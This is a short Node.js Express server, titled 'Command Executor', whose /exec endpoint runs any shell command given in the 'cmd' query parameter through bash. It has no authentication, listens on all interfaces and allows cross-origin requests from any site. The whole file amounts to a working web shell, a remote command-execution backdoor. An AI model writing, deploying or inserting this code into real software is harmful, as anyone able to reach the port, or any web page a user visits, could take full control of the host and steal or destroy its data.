const express = require('express');
const { exec } = require('child_process');
const app = express();
const PORT = 8888;

app.use(express.json());
app.use((req, res, next) => {
    res.header('Access-Control-Allow-Origin', '*');
    res.header('Access-Control-Allow-Methods', 'GET, POST, OPTIONS');
    res.header('Access-Control-Allow-Headers', '*');
    if (req.method === 'OPTIONS') return res.sendStatus(200);
    next();
});

app.get('/', (req, res) => res.send('<h2>Command Executor</h2><form action="/exec"><input name="cmd" size="50"><button>Run</button></form>'));

app.get('/exec', (req, res) => {
    const cmd = req.query.cmd;
    if (!cmd) return res.json({error: 'no cmd'});
    exec(cmd, {shell: '/bin/bash', timeout: 30000}, (err, stdout, stderr) => {
        res.json({cmd, stdout: stdout || '', stderr: stderr || '', error: err ? err.message : null});
    });
});

app.get('/health', (req, res) => res.json({status: 'ok', port: PORT}));

app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Server running on http://0.0.0.0:${PORT}`);
});
